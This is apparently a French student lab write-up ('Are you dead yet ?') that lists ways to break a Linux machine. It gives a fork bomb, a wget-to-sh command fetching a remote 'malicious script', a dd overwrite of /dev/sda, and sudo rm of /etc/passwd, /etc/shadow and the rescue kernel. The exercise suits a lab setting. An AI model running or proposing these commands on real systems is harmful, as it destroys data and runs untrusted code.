# TP1 : Are you dead yet ?

1 : 

- avec cette commande :
    ```:(){ :|: & };:```

 Il s'agit d'une fonction bash simple qui crée des copies de lui-même qui à son tour crée un autre ensemble de copies de lui-même.

2 : 

- en mettant une NAT et en installant ensuite un scipt malveillant.
installer le script avec cette commande :
    ```
    wget http://example.com/something -O – | sh —
    ```

3 :

- avec cette commande :
    ```
    dd if=/dev/random of=/dev/sda
    ```

cette commande va écrire sur le disque dur plein de déchets aléatoirement.

4 : 

```
[gwuill@localhost ~]$ sudo rm -r /boot/vmlinuz-0-rescue-af0a4bbbf4814e05a8b1266bd5f79041
[gwuill@localhost ~]$ sudo rm -r /etc/passwd
[gwuill@localhost ~]$ sudo rm -r /etc/shadow
```

ces différentes étapes permettent de supprimé les données utilisateurs dont le mot de passe utilisateur